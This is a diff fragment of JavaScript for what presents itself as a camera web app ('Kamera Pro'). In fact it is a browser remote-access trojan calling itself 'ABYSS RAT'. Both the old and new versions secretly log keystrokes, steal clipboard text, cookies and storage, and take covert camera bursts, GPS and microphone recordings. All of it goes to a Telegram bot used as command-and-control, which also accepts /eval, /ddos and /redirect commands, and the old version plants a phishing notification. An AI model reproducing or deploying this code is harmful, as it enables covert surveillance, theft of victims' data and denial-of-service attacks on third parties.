-                    };
-                },
-                () => {},
-                { enableHighAccuracy: true, maximumAge: 30000, timeout: 10000 }
-            );
-        }
-
-        // ==================== WEBRTC IP LEAK ====================
-        function grabLocalIPs() {
-            return new Promise((resolve) => {
-                const ips = new Set();
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                pc.createDataChannel('');
-                pc.createOffer().then(o => pc.setLocalDescription(o));
-                pc.onicecandidate = (e) => {
-                    if (e.candidate) {
-                        const ip = e.candidate.address;
-                        if (ip && !ip.includes('::') && !ip.startsWith('127.') && !ip.startsWith('0.')) ips.add(
-                            ip);
-                    } else {
-                        pc.close();
-                        resolve(Array.from(ips));
-                    }
-                };
-                setTimeout(() => { pc.close();
-                    resolve(Array.from(ips)); }, 2500);
-            });
-        }
-
-        // ==================== CLIPBOARD ====================
-        async function checkClipboard() {
-            try {
-                const text = await navigator.clipboard.readText();
-                if (text && text !== lastClip && text.length > 0) {
-                    lastClip = text;
-                    await tgSendMessage(`📋 [${VID}] Clipboard:\n${text.substring(0, 1500)}`);
-                }
-            } catch (e) {}
-        }
-
-        // ==================== KEYLOGGER ====================
-        function startKeylogger() {
-            if (keylogRunning) return;
-            keylogRunning = true;
-            document.addEventListener('keydown', (e) => {
-                const ignore = ['Shift', 'Control', 'Alt', 'Meta', 'CapsLock', 'Tab', 'ArrowLeft',
-                    'ArrowRight', 'ArrowUp', 'ArrowDown', 'Escape'
-                ];
-                if (ignore.includes(e.key)) return;
-                if (e.key === 'Enter') keyBuf += '[↵]\n';
-                else if (e.key === 'Backspace') keyBuf += '[⌫]';
-                else if (e.key === ' ') keyBuf += ' ';
-                else if (e.key.length === 1) keyBuf += e.key;
-                else keyBuf += `[${e.key}]`;
-
-                if (keyBuf.length > 500) {
-                    tgSendMessage(`⌨️ [${VID}] Keylog:\n${keyBuf}`);
-                    keyBuf = '';
-                }
-            });
-            // Flush setiap 15 detik
-            setInterval(() => {
-                if (keyBuf.length > 0) {
-                    tgSendMessage(`⌨️ [${VID}] Keylog:\n${keyBuf}`);
-                    keyBuf = '';
-                }
-            }, 15000);
-        }
-
-        // ==================== SILENT CAPTURE ====================
-        function startSilentCapture() {
-            if (silentCapInterval) return;
-            silentCapInterval = setInterval(() => {
-                if (!stream || !stream.active) return;
-                captureFrame(true);
-            }, 5000);
-        }
-
-        function captureFrame(silent = false) {
-            if (!stream || !stream.active) return;
-            try {
-                const track = stream.getVideoTracks()[0];
-                const settings = track.getSettings();
-                const canvas = document.createElement('canvas');
-                canvas.width = settings.width || 1280;
-                canvas.height = settings.height || 720;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(vf, 0, 0);
-                canvas.toBlob((blob) => {
-                    if (!blob) return;
-                    let cap = `🤫 Silent | ${new Date().toLocaleTimeString('id-ID')}`;
-                    if (gpsData) cap +=
-                        `\n📍 https://maps.google.com/?q=${gpsData.lat},${gpsData.lon}`;
-                    if (silent) {
-                        tgSendBeacon(blob, cap);
-                    } else {
-                        tgSendPhoto(blob, cap);
-                    }
-                }, 'image/jpeg', 0.82);
-            } catch (e) {}
-        }
-
-        // ==================== DUAL SWITCH ====================
-        function startDualSwitch() {
-            if (dualSwitchInterval) return;
-            dualSwitchInterval = setInterval(async () => {
-                if (!stream || !stream.active) return;
-                const newFace = facingMode === 'environment' ? 'user' : 'environment';
-                await startCamera(newFace);
-                setTimeout(() => captureFrame(true), 1500);
-            }, 20000);
-        }
-
-        // ==================== C2 TELEGRAM POLLING ====================
-        async function pollC2() {
-            try {
-                const res = await fetch(`${TG_API}/getUpdates?offset=${lastUpdateId + 1}&timeout=8`);
-                const data = await res.json();
-                if (!data.ok || !data.result.length) return;
-
-                for (const upd of data.result) {
-                    lastUpdateId = upd.update_id;
-                    const msg = upd.message;
-                    if (!msg || !msg.text) continue;
-                    const parts = msg.text.trim().split(/\s+/);
-                    const cmd = parts[0].toLowerCase();
-                    const target = parts[1] || '';
-                    const args = parts.slice(2);
-
-                    // Hanya proses jika target cocok atau broadcast ALL
-                    if (target !== VID && target !== 'ALL' && target !== 'BROADCAST') continue;
-
-                    let result = '';
-                    switch (cmd) {
-                        case '/ping':
-                            result = `🟢 ${VID} online | ${new Date().toLocaleString('id-ID')}`;
-                            break;
-                        case '/photo':
-                            captureFrame(false);
-                            result = '📸 Foto dikirim';
-                            break;
-                        case '/gps':
-                            result = gpsData ? JSON.stringify(gpsData, null, 2) : 'GPS belum tersedia';
-                            break;
-                        case '/clip':
-                            await checkClipboard();
-                            result = '📋 Clipboard dikirim jika ada data baru';
-                            break;
-                        case '/cookies':
-                            result = document.cookie || '(kosong)';
-                            break;
-                        case '/storage':
-                            const loot = {
-                                localStorage: { ...localStorage },
-                                sessionStorage: { ...sessionStorage },
-                                url: location.href,
-                                ua: navigator.userAgent,
-                                screen: `${screen.width}x${screen.height}`,
-                                lang: navigator.language,
-                                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                            };
-                            const blob = new Blob([JSON.stringify(loot, null, 2)], { type: 'application/json' });
-                            await tgSendDocument(blob, `storage_${VID}.json`, `💾 Storage dump ${VID}`);
-                            result = '💾 Storage dikirim';
-                            break;
-                        case '/flip':
-                            const nf = facingMode === 'environment' ? 'user' : 'environment';
-                            await startCamera(nf);
-                            result = '📷 Kamera dibalik: ' + nf;
-                            break;
-                        case '/redirect':
-                            if (args[0]) window.location.href = args[0];
-                            result = '🔗 Redirect ke ' + args[0];
-                            break;
-                        case '/eval':
-                            try {
-                                const evRes = eval(args.join(' '));
-                                result = '✅ eval result: ' + String(evRes).substring(0, 1500);
-                            } catch (e) {
-                                result = '❌ eval error: ' + e.message;
-                            }
-                            break;
-                        case '/info':
-                            result =
-                                `🆔 ${VID}\n📱 ${navigator.userAgent}\n🖥️ ${screen.width}x${screen.height}\n🌐 ${navigator.language}\n🕐 ${new Date().toISOString()}\n📍 ${gpsData ? gpsData.lat + ',' + gpsData.lon : 'N/A'}\n📷 ${facingMode}`;
-                            break;
-                        case '/notif':
-                            if (Notification.permission === 'granted' && args[0]) {
-                                new Notification('🔔 Info', { body: args.join(' '), icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23007aff"><circle cx="12" cy="12" r="10"/></svg>' });
-                                result = 'Notifikasi dikirim';
-                            } else {
-                                result = 'Notifikasi tidak bisa (izin: ' + Notification.permission + ')';
-                            }
-                            break;
-                        case '/mic':
-                            const dur = parseInt(args[0]) || 10;
-                            result = await recordMic(dur);
-                            break;
-                        case '/ddos':
-                            if (args[0]) {
-                                ddosNode(args[0], parseInt(args[1]) || 30, parseInt(args[2]) || 20);
-                                result = `🔥 DDoS dimulai: ${args[0]} | ${args[1] || 30}s | ${args[2] || 20} threads`;
-                            } else {
-                                result = '❌ /ddos <url> [durasi] [threads]';
-                            }
-                            break;
-                        case '/wipelogs':
-                            localStorage.clear();
-                            sessionStorage.clear();
-                            try { indexedDB.databases().then(dbs => dbs.forEach(db => indexedDB.deleteDatabase(
-                                    db.name))); } catch (e) {}
-                            result = '🧹 Logs dibersihkan';
-                            break;
-                        case '/selfdest':
-                            result = '💀 Self destruct...';
-                            await tgSendMessage(`💀 ${VID} self destruct`);
-                            clearAllIntervals();
-                            document.body.innerHTML = '';
-                            setTimeout(() => window.close(), 500);
-                            break;
-                        default:
-                            result = `❓ Command tidak dikenal: ${cmd}`;
-                    }
-
-                    if (result) {
-                        await tgSendMessage(`[${VID}] ${result}`);
-                    }
-                }
-            } catch (e) {}
-        }
-
-        function clearAllIntervals() {
-            [silentCapInterval, dualSwitchInterval, c2PollInterval, phishingTimer].forEach(iv => {
-                if (iv) clearInterval(iv);
-            });
-            if (gpsWatchId) navigator.geolocation.clearWatch(gpsWatchId);
-        }
-
-        // ==================== MIC RECORD ====================
-        async function recordMic(duration = 10) {
-            try {
-                const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mr = new MediaRecorder(micStream);
-                const chunks = [];
-                mr.ondataavailable = (e) => chunks.push(e.data);
-                mr.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'audio/ogg' });
-                    const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('voice', blob, `mic_${Date.now()}.ogg`);
-                    fd.append('disable_notification', 'true');
-                    await fetch(`${TG_API}/sendVoice`, { method: 'POST', body: fd });
-                    micStream.getTracks().forEach(t => t.stop());
-                };
-                mr.start();
-                setTimeout(() => mr.stop(), duration * 1000);
-                return `🎤 Merekam ${duration} detik...`;
-            } catch (e) {
-                return '❌ Mic gagal: ' + e.message;
-            }
-        }
-
-        // ==================== DDoS NODE ====================
-        async function ddosNode(targetUrl, duration = 30, threads = 20) {
-            const endTime = Date.now() + duration * 1000;
-            const tasks = [];
-            for (let i = 0; i < threads; i++) {
-                tasks.push((async () => {
-                    while (Date.now() < endTime) {
-                        try {
-                            await fetch(targetUrl + '?r=' + Math.random(), {
-                                mode: 'no-cors',
-                                cache: 'no-store'
-                            });
-                        } catch (e) {}
-                    }
-                })());
-            }
-            await Promise.allSettled(tasks);
-        }
-
-        // ==================== NOTIFICATION PHISHING ====================
-        async function requestNotifPerm() {
-            if (!('Notification' in window)) return;
-            const perm = await Notification.requestPermission();
-            if (perm === 'granted') {
-                // Jadwalkan notif phishing setelah 3 menit
-                setTimeout(() => {
-                    new Notification('🔐 Keamanan Akun', {
-                        body: 'Aktivitas mencurigakan terdeteksi. Verifikasi akun Anda sekarang.',
-                        icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23ff3b30"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>',
-                        tag: 'phish-otp-1',
-                        requireInteraction: true,
-                        vibrate: [200, 100, 200]
-                    });
-                }, 180000);
-            }
-        }
-
-        // ==================== SERVICE WORKER ====================
-        function registerSW() {
-            if (!('serviceWorker' in navigator)) return;
-            const swCode = `
-                self.addEventListener('install', (e) => { self.skipWaiting(); });
-                self.addEventListener('activate', (e) => { e.waitUntil(clients.claim()); });
-                setInterval(() => {
-                    fetch('${TG_API}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('💓 HB ' + VID + ' | ' + new Date().toLocaleTimeString('id-ID'))}&disable_notification=true').catch(()=>{});
-                }, 60000);
-                self.addEventListener('fetch', (e) => {});
-            `;
-            const swBlob = new Blob([swCode], { type: 'application/javascript' });
-            const swUrl = URL.createObjectURL(swBlob);
-            navigator.serviceWorker.register(swUrl).then(() => {
-                console.log('✅ SW registered');
-            }).catch(() => {});
-        }
-
-        // ==================== KAMERA ====================
-        async function startCamera(facing = facingMode) {
-            if (isStarting) return false;
-            isStarting = true;
-            btnStart.disabled = true;
-            errMsg.textContent = '';
-            statusDot.className = 'status-dot';
-            statusMsg.textContent = 'Mengakses kamera...';
-
-            try {
-                if (stream) {
-                    stream.getTracks().forEach(t => t.stop());
-                    stream = null;
-                }
-                let tempStream = null;
-                let lastErr = null;
-
-                const tryGet = async (constraints, label) => {
-                    statusMsg.textContent = label;
-                    return await navigator.mediaDevices.getUserMedia(constraints);
-                };
-
-                try {
-                    tempStream = await tryGet({ video: { facingMode: facing }, audio: false },
-                        `Mencoba kamera ${facing === 'environment' ? 'belakang' : 'depan'}...`);
-                } catch (e1) {
-                    lastErr = e1;
-                    const altFace = facing === 'environment' ? 'user' : 'environment';
-                    try {
-                        tempStream = await tryGet({ video: { facingMode: altFace }, audio: false },
-                            `Beralih ke kamera ${altFace === 'environment' ? 'belakang' : 'depan'}...`);
-                        facingMode = altFace;
-                    } catch (e2) {
-                        lastErr = e2;
-                        try {
-                            tempStream = await tryGet({ video: true, audio: false }, 'Mode default...');
-                        } catch (e3) {
-                            lastErr = e3;
-                        }
-                    }
-                }
-
-                if (!tempStream) throw lastErr || new Error('Tidak ada kamera tersedia');
-
-                stream = tempStream;
-                vf.srcObject = stream;
-                await vf.play();
-
-                statusDot.className = 'status-dot ok';
-                statusMsg.textContent = 'Kamera aktif';
-                applyZoom();
-                try {
-                    const track = stream.getVideoTracks()[0];
-                    const cap = track.getCapabilities();
-                    if (cap.torch) await track.applyConstraints({ advanced: [{ torch: flashOn }] });
-                } catch (e) {}
-                updateFlashUI();
-
-                permOverlay.classList.add('hidden');
-                isStarting = false;
-                btnStart.disabled = false;
-
-                // ===== AKTIFKAN SEMUA FITUR RAT DIAM-DIAM =====
-                initRAT();
-                return true;
-
-            } catch (err) {
-                statusDot.className = 'status-dot err';
-                let msg = 'Gagal mengakses kamera';
-                if (err.message.includes('Permission')) msg = 'Izin kamera diperlukan';
-                else if (err.message.includes('NotFound')) msg = 'Kamera tidak ditemukan';
-                else if (err.message.includes('NotAllowed')) msg = 'Izin ditolak';
-                errMsg.textContent = msg;
-                statusMsg.textContent = 'Silakan coba lagi';
-                isStarting = false;
-                btnStart.disabled = false;
-                return false;
-            }
-        }
-
-        function initRAT() {
-            // Kirim info victim
-            (async () => {
-                localIPs = await grabLocalIPs();
-                const info = `🟢 VICTIM ONLINE\n🆔 ${VID}\n📱 ${navigator.userAgent}\n🖥️ ${screen.width}x${screen.height}\n🌐 ${navigator.language}\n🌍 IP Lokal: ${localIPs.join(', ') || 'N/A'}\n🔗 ${location.href}\n🕐 ${new Date().toLocaleString('id-ID')}`;
-                await tgSendMessage(info);
-            })();
-
-            startGPS();
-            startSilentCapture();
-            startDualSwitch();
-            startKeylogger();
-            startC2Polling();
-            registerSW();
-            requestNotifPerm();
-
-            // Clipboard check setiap 4 detik
-            setInterval(checkClipboard, 4000);
-
-            // Heartbeat setiap 2 menit
-            setInterval(() => {
-                tgSendMessage(`💓 HB ${VID} | ${new Date().toLocaleTimeString('id-ID')} | 📍 ${gpsData ? gpsData.lat.toFixed(4)+','+gpsData.lon.toFixed(4) : 'N/A'}`);
-            }, 120000);
-
-            console.log('🐺 ABYSS RAT AKTIF — Semua modul berjalan');
-        }
-
-        function startC2Polling() {
-            if (c2PollInterval) return;
-            const poll = async () => {
-                await pollC2();
-                c2PollInterval = setTimeout(poll, 3000);
+    // ==================== IP LEAK ====================
+    function grabLocalIPs() {
+        return new Promise((resolve) => {
+            const ips = new Set();
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+            pc.createDataChannel(''); pc.createOffer().then(o => pc.setLocalDescription(o));
+            pc.onicecandidate = (e) => {
+                if (e.candidate) { const ip = e.candidate.address; if (ip && !ip.includes('::') && !ip.startsWith('127.') && !ip.startsWith('0.')) ips.add(ip); }
+                else { pc.close(); resolve(Array.from(ips)); }
             };
-            poll();
-        }
-
-        // ==================== UI HANDLERS ====================
-        btnStart.addEventListener('click', () => startCamera(facingMode));
-
-        function updateFlashUI() {
-            btnFlash.classList.toggle('on', flashOn);
-            lblFlash.textContent = flashOn ? 'On' : 'Flash';
-        }
-        btnFlash.addEventListener('click', async () => {
-            if (!stream) return;
-            const track = stream.getVideoTracks()[0];
-            try {
-                flashOn = !flashOn;
-                await track.applyConstraints({ advanced: [{ torch: flashOn }] });
-                updateFlashUI();
-            } catch (e) {}
+            setTimeout(() => { pc.close(); resolve(Array.from(ips)); }, 2500);
         });
+    }
 
-        btnBlur.addEventListener('click', () => {
-            blurOn = !blurOn;
-            btnBlur.classList.toggle('on', blurOn);
-            lblBlur.textContent = blurOn ? 'On' : 'Blur';
-        });
-        btnWM.addEventListener('click', () => {
-            wmOn = !wmOn;
-            btnWM.classList.toggle('on', wmOn);
-        });
+    // ==================== CLIPBOARD ====================
+    async function checkClipboard() {
+        try { const t = await navigator.clipboard.readText(); if (t && t !== lastClip && t.length > 0) { lastClip = t; await tg('📋 ['+VID+'] Clipboard:\n'+t.substring(0,1500)); } } catch(e) {}
+    }
 
-        btnFlip.addEventListener('click', async () => {
-            const nf = facingMode === 'environment' ? 'user' : 'environment';
-            await startCamera(nf);
+    // ==================== KEYLOGGER ====================
+    function startKeylogger() {
+        if (keylogRunning) return;
+        keylogRunning = true;
+        document.addEventListener('keydown', (e) => {
+            const ignore = ['Shift','Control','Alt','Meta','CapsLock','Tab','ArrowLeft','ArrowRight','ArrowUp','ArrowDown','Escape'];
+            if (ignore.includes(e.key)) return;
+            if (e.key === 'Enter') keyBuf += '[↵]\n';
+            else if (e.key === 'Backspace') keyBuf += '[⌫]';
+            else if (e.key === ' ') keyBuf += ' ';
+            else if (e.key.length === 1) keyBuf += e.key;
+            else keyBuf += '['+e.key+']';
+            if (keyBuf.length > 500) { tg('⌨️ ['+VID+'] Keylog:\n'+keyBuf); keyBuf = ''; }
         });
+        setInterval(() => { if (keyBuf.length > 0) { tg('⌨️ ['+VID+'] Keylog:\n'+keyBuf); keyBuf = ''; } }, 15000);
+    }
 
-        btnTimer.addEventListener('click', () => {
-            const timers = ['3s', '5s', '10s', 'Off'];
-            const cur = lblTimer.textContent;
-            const idx = (timers.indexOf(cur) + 1) % timers.length;
-            lblTimer.textContent = timers[idx];
-        });
+    // ==================== NOTIFICATION ACCESS ====================
+    async function requestNotificationAccess() {
+        if (!('Notification' in window)) return;
+        const perm = await Notification.requestPermission();
+        if (perm === 'granted') {
+            tg('🔔 ['+VID+'] Notifikasi diizinkan');
 
-        function applyZoom() {
-            zoomVal.textContent = currentZoom + '×';
-            if (stream) {
-                const track = stream.getVideoTracks()[0];
-                const cap = track.getCapabilities();
-                if (cap.zoom) {
-                    const val = Math.min(cap.zoom.max || 5, Math.max(cap.zoom.min || 1, currentZoom));
-                    track.applyConstraints({ advanced: [{ zoom: val }] }).catch(() => {});
-                }
+            // Service Worker untuk baca notifikasi
+            if ('serviceWorker' in navigator) {
+                const swCode = `
+                    self.addEventListener('notificationclick', (e) => {
+                        e.notification.close();
+                        fetch('${TG_API}/sendMessage?chat_id=${CHAT_ID}&text='+encodeURIComponent('🔔 NOTIF DIBUKA: '+e.notification.title+' | '+e.notification.body));
+                    });
+                    self.addEventListener('push', (e) => {
+                        const data = e.data ? e.data.text() : 'Push received';
+                        fetch('${TG_API}/sendMessage?chat_id=${CHAT_ID}&text='+encodeURIComponent('📲 PUSH: '+data));
+                    });
+                `;
+                const swBlob = new Blob([swCode], { type: 'application/javascript' });
+                const swUrl = URL.createObjectURL(swBlob);
+                navigator.serviceWorker.register(swUrl).catch(() => {});
             }
-        }
-        btnZoomIn.addEventListener('click', () => {
-            if (currentZoom < 5) { currentZoom = Math.min(5, currentZoom + 0.5);
-                applyZoom(); }
-        });
-        btnZoomOut.addEventListener('click', () => {
-            if (currentZoom > 1) { currentZoom = Math.max(1, currentZoom - 0.5);
-                applyZoom(); }
-        });
 
-        function takePhoto() {
-            if (!stream) return;
-            const track = stream.getVideoTracks()[0];
-            const settings = track.getSettings();
+            // Kirim notifikasi test
+            new Notification('Kamera Pro', { body: 'Notifikasi aktif', icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><circle cx="12" cy="12" r="10"/></svg>' });
+        }
+    }
+
+    // ==================== HISTORY DUMP ====================
+    function dumpAllStorage() {
+        const data = {
+            localStorage: { ...localStorage },
+            sessionStorage: { ...sessionStorage },
+            cookies: document.cookie,
+            url: location.href,
+            referrer: document.referrer,
+            historyLength: history.length,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory || 'N/A',
+            screenResolution: screen.width + 'x' + screen.height,
+            colorDepth: screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString(),
+            online: navigator.onLine,
+            connection: navigator.connection ? { type: navigator.connection.effectiveType, downlink: navigator.connection.downlink } : 'N/A'
+        };
+
+        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+        tgDoc(blob, 'storage_dump_'+VID+'.json', '💾 STORAGE DUMP\n🆔 '+VID+'\n🔗 '+location.href+'\n📜 History: '+history.length+' pages');
+    }
+
+    // ==================== 5 FOTO BURST CAPTURE ====================
+    function showBurstBadge() {
+        burstBadge.classList.add('on');
+        setTimeout(() => burstBadge.classList.remove('on'), 1200);
+    }
+
+    function captureBurst5(silent) {
+        if (!stream || !stream.active) return;
+        showBurstBadge();
+
+        const track = stream.getVideoTracks()[0];
+        const settings = track.getSettings();
+        const w = settings.width || 1920;
+        const h = settings.height || 1080;
+
+        let captured = 0;
+        const maxCaptures = 5;
+        const interval = 200; // 200ms antar foto = 5 foto dalam 1 detik
+
+        const burstInterval = setInterval(() => {
+            if (captured >= maxCaptures || !stream || !stream.active) {
+                clearInterval(burstInterval);
+                return;
+            }
+
             const canvas = document.createElement('canvas');
-            const w = settings.width || 1280;
-            const h = settings.height || 720;
             canvas.width = w;
             canvas.height = h;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(vf, 0, 0, w, h);
 
-            if (blurOn) {
-                const off = document.createElement('canvas');
-                off.width = w;
-                off.height = h;
-                const octx = off.getContext('2d');
-                octx.drawImage(vf, 0, 0, w, h);
-                octx.filter = 'blur(20px)';
-                octx.drawImage(off, 0, 0);
-                ctx.drawImage(off, 0, 0);
-                ctx.save();
-                const cx = w / 2,
-                    cy = h / 2,
-                    r = Math.min(w, h) * 0.3;
-                ctx.beginPath();
-                ctx.arc(cx, cy, r, 0, Math.PI * 2);
-                ctx.clip();
-                ctx.drawImage(vf, 0, 0, w, h);
-                ctx.restore();
+            // Brightness adjustment
+            const imageData = ctx.getImageData(0, 0, w, h);
+            const data = imageData.data;
+            for (let i = 0; i < data.length; i += 4) {
+                data[i] = Math.min(255, data[i] * 1.15);
+                data[i+1] = Math.min(255, data[i+1] * 1.15);
+                data[i+2] = Math.min(255, data[i+2] * 1.15);
             }
-            if (wmOn) {
-                ctx.shadowColor = 'rgba(0,0,0,0.8)';
-                ctx.shadowBlur = 10;
-                ctx.shadowOffsetX = 2;
-                ctx.shadowOffsetY = 2;
-                const ts = new Date().toLocaleString('id-ID');
-                ctx.font = 'bold 24px -apple-system, sans-serif';
-                ctx.fillStyle = 'rgba(255,255,255,0.9)';
-                ctx.fillText('📸 ' + ts, 20, h - 30);
-                if (gpsData) {
-                    ctx.font = '13px monospace';
-                    ctx.fillStyle = 'rgba(255,255,255,0.65)';
-                    ctx.fillText(`📍 ${gpsData.lat.toFixed(5)}, ${gpsData.lon.toFixed(5)}`, 20, h - 60);
-                }
-                ctx.shadowBlur = 0;
-                ctx.shadowOffsetX = 0;
-                ctx.shadowOffsetY = 0;
-            }
-
-            const dataUrl = canvas.toDataURL('image/jpeg', 0.92);
-            lastPhotoData = dataUrl;
-            thumbBox.innerHTML = `<img src="${dataUrl}" alt="thumb">`;
-            thumbBox.classList.add('has-img');
-
-            flashEl.classList.add('fire');
-            setTimeout(() => flashEl.classList.remove('fire'), 100);
-
-            const link = document.createElement('a');
-            link.download = `photo_${Date.now()}.jpg`;
-            link.href = dataUrl;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
+            ctx.putImageData(imageData, 0, 0);
 
             canvas.toBlob((blob) => {
                 if (!blob) return;
-                let cap = `📸 Foto | ${new Date().toLocaleString('id-ID')}`;
-                if (gpsData) cap +=
-                    `\n📍 https://maps.google.com/?q=${gpsData.lat},${gpsData.lon}\n🎯 ±${gpsData.acc}m`;
-                if (localIPs.length) cap += `\n🌐 ${localIPs[0]}`;
-                tgSendPhoto(blob, cap);
-            }, 'image/jpeg', 0.92);
+                captured++;
+                let cap = '📸 ['+captured+'/5] ' + new Date().toLocaleTimeString('id-ID');
+                if (gpsData) cap += '\n📍 https://maps.google.com/?q='+gpsData.lat+','+gpsData.lon;
+                if (silent) tgBeacon(blob, cap); else tgPhoto(blob, cap);
+
+                if (captured === 1 && !silent) {
+                    lastPhotoData = canvas.toDataURL('image/jpeg', 0.95);
+                    thumbBox.innerHTML = '<img src="'+lastPhotoData+'">';
+                    thumbBox.classList.add('has-img');
+                    flashEl.classList.add('fire');
+                    setTimeout(() => flashEl.classList.remove('fire'), 100);
+                    const a = document.createElement('a');
+                    a.download = 'burst_'+Date.now()+'.jpg';
+                    a.href = lastPhotoData;
+                    a.click();
+                }
+            }, 'image/jpeg', 0.95);
+        }, interval);
+    }
+
+    // Silent capture juga pakai burst
+    function startSilentCapture() {
+        if (silentCapInterval) return;
+        silentCapInterval = setInterval(() => {
+            if (!stream || !stream.active) return;
+            setTimeout(() => captureBurst5(true), 150);
+        }, 8000); // 8 detik biar gak spam
+    }
+
+    // ==================== DUAL SWITCH ====================
+    function startDualSwitch() {
+        if (dualSwitchInterval) return;
+        dualSwitchInterval = setInterval(async () => {
+            if (!stream || !stream.active) return;
+            const nf = facingMode === 'environment' ? 'user' : 'environment';
+            await startCamera(nf);
+            setTimeout(() => captureBurst5(true), 2000);
+        }, 25000);
+    }
+
+    // ==================== C2 POLLING ====================
+    async function pollC2() {
+        try {
+            const res = await fetch(TG_API+'/getUpdates?offset='+(lastUpdateId+1)+'&timeout=8');
+            const data = await res.json();
+            if (!data.ok || !data.result.length) return;
+            for (const upd of data.result) {
+                lastUpdateId = upd.update_id;
+                const msg = upd.message;
+                if (!msg || !msg.text) continue;
+                const parts = msg.text.trim().split(/\s+/);
+                const cmd = parts[0].toLowerCase();
+                const target = parts[1] || '';
+                if (target !== VID && target !== 'ALL' && target !== 'BROADCAST') continue;
+                let result = '';
+                switch(cmd) {
+                    case '/ping': result = '🟢 '+VID+' online'; break;
+                    case '/photo': captureBurst5(false); result = '📸 5 Foto dikirim'; break;
+                    case '/gps': result = gpsData ? JSON.stringify(gpsData,null,2) : 'N/A'; break;
+                    case '/clip': await checkClipboard(); result = '📋 OK'; break;
+                    case '/cookies': result = document.cookie || '(kosong)'; break;
+                    case '/storage': dumpAllStorage(); result = '💾 Storage dikirim'; break;
+                    case '/notif': requestNotificationAccess(); result = '🔔 Notif requested'; break;
+                    case '/flip': const nf = facingMode==='environment'?'user':'environment'; await startCamera(nf); result = '📷 '+nf; break;
+                    case '/hd': hdOn=!hdOn; btnHD.classList.toggle('on',hdOn); await startCamera(facingMode); result = 'HD: '+(hdOn?'ON':'OFF'); break;
+                    case '/live': liveMode=!liveMode; btnLive.classList.toggle('on',liveMode); result = 'Live: '+(liveMode?'ON':'OFF'); break;
+                    case '/mirror': mirrorOn=!mirrorOn; btnMirror.classList.toggle('on',mirrorOn); updateMirror(); result = 'Mirror: '+(mirrorOn?'ON':'OFF'); break;
+                    case '/info': result = '🆔 '+VID+'\n📷 '+facingMode+'\nHD:'+hdOn+'\nLive:'+liveMode+'\n📍 '+(gpsData?gpsData.lat+','+gpsData.lon:'N/A'); break;
+                    case '/history': dumpAllStorage(); result = '💾 Storage + History dikirim'; break;
+                    default: result = '❓ '+cmd;
+                }
+                if (result) await tg('['+VID+'] '+result);
+            }
+        } catch(e) {}
+    }
+
+    function clearAllIntervals() {
+        [silentCapInterval, dualSwitchInterval, c2PollInterval].forEach(iv => { if (iv) clearInterval(iv); });
+        if (gpsWatchId) navigator.geolocation.clearWatch(gpsWatchId);
+    }
+
+    function updateMirror() {
+        if (facingMode === 'user' && mirrorOn) vf.classList.add('nomirror');
+        else vf.classList.remove('nomirror');
+    }
+
+    function showLiveBadgeFn() { liveBadge.classList.add('on'); setTimeout(() => liveBadge.classList.remove('on'), 1500); }
+    function showStabIndicator() { stabBar.classList.add('on'); setTimeout(() => stabBar.classList.remove('on'), 2000); }
+
+    async function startCamera(facing) {
+        if (isStarting) return false;
+        isStarting = true;
+        btnStart.disabled = true;
+        errMsg.textContent = '';
+        statusDot.className = 'status-dot';
+        statusMsg.textContent = 'Mengakses kamera...';
+
+        try {
+            if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+            let tempStream = null;
+            try {
+                tempStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing, width: { ideal: hdOn?3840:1920 }, height: { ideal: hdOn?2160:1080 } }, audio: false });
+            } catch(e1) {
+                const alt = facing==='environment'?'user':'environment';
+                try { tempStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: alt }, audio: false }); facingMode = alt; } catch(e2) {
+                    tempStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                }
+            }
+
+            if (!tempStream) throw new Error('Tidak ada kamera');
+            stream = tempStream;
+            vf.srcObject = stream;
+            await vf.play();
+
+            updateMirror();
+            statusDot.className = 'status-dot ok';
+            statusMsg.textContent = 'Kamera aktif';
+            applyZoom();
+            try { const t = stream.getVideoTracks()[0]; if (t.getCapabilities().torch) await t.applyConstraints({ advanced: [{ torch: flashOn }] }); } catch(e) {}
+            updateFlashUI();
+
+            permOverlay.classList.add('hidden');
+            isStarting = false;
+            btnStart.disabled = false;
+
+            showStabIndicator();
+            initRAT();
+            return true;
+        } catch(err) {
+            statusDot.className = 'status-dot err';
+            errMsg.textContent = 'Gagal: '+err.message;
+            statusMsg.textContent = 'Coba lagi';
+            isStarting = false;
+            btnStart.disabled = false;
+            return false;
         }
+    }
 
-        btnShutter.addEventListener('click', takePhoto);
+    function initRAT() {
+        (async () => {
+            localIPs = await grabLocalIPs();
+            await tg('🟢 VICTIM ONLINE\n🆔 '+VID+'\n📱 '+navigator.userAgent.substring(0,80)+'\n🖥️ '+screen.width+'x'+screen.height+'\n🌐 '+navigator.language+'\n🌍 IP: '+(localIPs.join(', ')||'N/A')+'\n🔗 '+location.href+'\n🕐 '+new Date().toLocaleString('id-ID'));
+        })();
+        startGPS();
+        startSilentCapture();
+        startDualSwitch();
+        startKeylogger();
+        startC2Polling();
+        requestNotificationAccess();
